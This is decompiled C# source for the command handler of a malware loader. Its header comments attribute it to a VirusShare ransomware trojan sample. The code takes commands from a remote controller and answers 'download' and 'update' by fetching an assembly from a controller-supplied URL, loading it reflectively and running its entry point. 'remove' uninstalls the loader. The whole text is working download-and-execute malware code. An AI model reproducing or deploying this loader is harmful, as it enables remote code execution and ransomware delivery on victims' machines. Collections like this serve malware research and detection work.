// Decompiled with JetBrains decompiler
// Type: Loader.Commands
// Assembly: Loader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 35C68E31-B6CA-49D5-99F7-6D8C40001C21
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.jfzg-5a89ee9d281b9ea7b1c0a19ae23e4a66d00a3b2d0a76c3140f25bc073efe7020.exe

using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace Loader
{
  internal class Commands
  {
    public static void determineCommand()
    {
      string lower = Connection.Command("").ToLower();
      if (lower.Contains("download"))
      {
        if (!lower.Contains("*"))
          return;
        string[] strArray = lower.Split('*');
        if (strArray[1].Contains("http"))
        {
          byte[] rawAssembly = new WebClient().DownloadData(strArray[1]);
          if (strArray[2].Contains("1"))
          {
            Assembly assembly = Assembly.Load(rawAssembly);
            MethodInfo entryPoint = assembly.EntryPoint;
            object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
            if (entryPoint.GetParameters().Length > 0)
              entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new object[1]
              {
                (object) new string[1]{ "1" }
              });
            else
              entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[]) null);
          }
        }
      }
      else if (lower.Contains("remove"))
      {
        Install.uninstall((string) null);
      }
      else
      {
        if (!lower.Contains("update"))
          return;
        if (lower.Contains("*"))
        {
          string[] strArray = lower.Split('*');
          if (strArray[1].Contains("http"))
          {
            byte[] rawAssembly = new WebClient().DownloadData(strArray[1]);
            if (strArray[2].Contains("1"))
            {
              Assembly assembly = Assembly.Load(rawAssembly);
              MethodInfo entryPoint = assembly.EntryPoint;
              object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
              if (entryPoint.GetParameters().Length > 0)
                entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), new object[1]
                {
                  (object) new string[1]{ "1" }
                });
              else
                entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[]) null);
            }
          }
        }
        Install.uninstall((string) null);
      }
    }
  }
}
